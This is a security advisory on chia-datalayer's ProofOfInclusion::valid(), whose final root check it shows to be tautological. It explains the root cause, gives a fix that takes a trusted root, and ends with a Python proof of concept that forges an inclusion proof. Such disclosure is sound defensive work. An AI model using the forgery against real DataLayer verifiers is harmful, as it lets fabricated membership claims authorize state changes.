### Title
`ProofOfInclusion::valid()` Final Root-Hash Check Is a Tautology — Forged DataLayer Inclusion Proofs Always Pass - (File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs)

### Summary
The `ProofOfInclusion::valid()` method in the DataLayer Merkle proof implementation contains a tautological final check: `existing_hash == self.root_hash()`. Because `self.root_hash()` returns `last.combined_hash`, and the loop body already asserted `calculated_hash == layer.combined_hash` before assigning `existing_hash = calculated_hash`, the final comparison is always `true` when the loop completes without error. The function never compares against any externally-supplied, trusted tree root. An attacker who can submit a `ProofOfInclusion` object (a Streamable type exposed via Python bindings) can forge a proof of inclusion for any key against any claimed root, and `valid()` will accept it.

### Finding Description

**Root cause — tautological final check in `valid()`**

`crates/chia-datalayer/src/merkle/proof_of_inclusion.rs` lines 40–58:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {   // ← loop invariant
            return false;
        }

        existing_hash = calculated_hash;              // ← existing_hash = layer.combined_hash
    }

    existing_hash == self.root_hash()                 // ← always true: see root_hash() below
}
```

`root_hash()` (lines 32–38):

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash                            // ← same value as existing_hash after loop
    } else {
        self.node_hash
    }
}
```

After the last loop iteration:
- `existing_hash` = `calculated_hash` from that iteration
- The loop guard already verified `calculated_hash == last.combined_hash`
- `self.root_hash()` returns `last.combined_hash`

Therefore `existing_hash == self.root_hash()` reduces to `last.combined_hash == last.combined_hash` — unconditionally `true`. The function never touches any externally-known, authoritative root.

**Exploit construction**

`ProofOfInclusion` is a `Streamable` type exposed to Python. An attacker picks any target `node_hash` (the key they wish to falsely prove is included) and builds an internally-consistent layer chain:

1. Choose arbitrary `other_hash_side` and `other_hash`.
2. Compute `combined_hash = calculate_internal_hash(node_hash, other_hash_side, other_hash)`.
3. Construct `ProofOfInclusionLayer { other_hash_side, other_hash, combined_hash }`.
4. Wrap in `ProofOfInclusion { node_hash, layers: [layer] }`.

`proof.valid()` returns `true`. `proof.root_hash()` returns the attacker-chosen `combined_hash`. Any verifier that calls only `proof.valid()` — the natural, documented API — accepts the forged proof.

**Entry path**

`ProofOfInclusion` is deserializable from bytes via `from_bytes` / `parse_rust` (Python stubs at `wheel/python/chia_rs/datalayer.pyi` lines 221–225). Any DataLayer peer, RPC handler, or light-client endpoint that accepts a serialized `ProofOfInclusion` and calls `.valid()` is reachable by an unprivileged network attacker.

### Impact Explanation

A forged `ProofOfInclusion` passes `valid()` for any claimed `node_hash` against any claimed root. DataLayer applications that rely on `proof.valid()` to authenticate key-value membership — e.g., to authorize state transitions, verify off-chain data commitments, or gate coin-spend conditions that read DataLayer state — will accept fabricated membership claims. This directly satisfies the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."*

### Likelihood Explanation

- `ProofOfInclusion` is a first-class Streamable type with Python bindings; it is designed to be transmitted between parties.
- The method is named `valid()`, strongly implying it is the complete validation step. There is no documentation warning callers to additionally compare `proof.root_hash()` against a trusted root.
- Tests in both Rust (`proof_of_inclusion.rs` lines 123, 155) and Python (`test_datalayer.py` lines 339, 364) call `proof.valid()` as the sole assertion, establishing the pattern that downstream integrators will follow.
- No cryptographic primitive needs to be broken; the attacker only needs to compute one SHA-256 hash.

### Recommendation

Replace the self-referential `root_hash()` call with a comparison against a caller-supplied trusted root:

```rust
// New API — caller must supply the authoritative root
pub fn valid_for_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == *expected_root   // compare against external, trusted root
}
```

Deprecate or remove the zero-argument `valid()`. Update all call sites — including the Python bindings and tests — to pass the known tree root obtained from a trusted `MerkleBlob` or on-chain commitment.

### Proof of Concept

```python
# Forge a proof claiming `target_key_hash` is in a DataLayer tree.
# No knowledge of the actual tree is required.

import hashlib
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer

target_key_hash = bytes([0x42] * 32)   # any 32-byte key hash to falsely prove
other_hash      = bytes([0x00] * 32)   # arbitrary sibling hash
other_hash_side = 1                    # place sibling on the right

# Compute the combined hash exactly as calculate_internal_hash does
# (SHA-256 of type-byte || left || right; exact byte layout from chia-datalayer)
combined_hash = hashlib.sha256(
    b'\x02' + target_key_hash + other_hash
).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=other_hash_side,
    other_hash=other_hash,
    combined_hash=combined_hash,   # attacker-controlled "root"
)

forged_proof = ProofOfInclusion(node_hash=target_key_hash, layers=[layer])

assert forged_proof.valid()          # ← True: forged proof accepted
assert forged_proof.root_hash() == combined_hash  # attacker controls the root
# Any verifier calling only forged_proof.valid() is deceived.
```
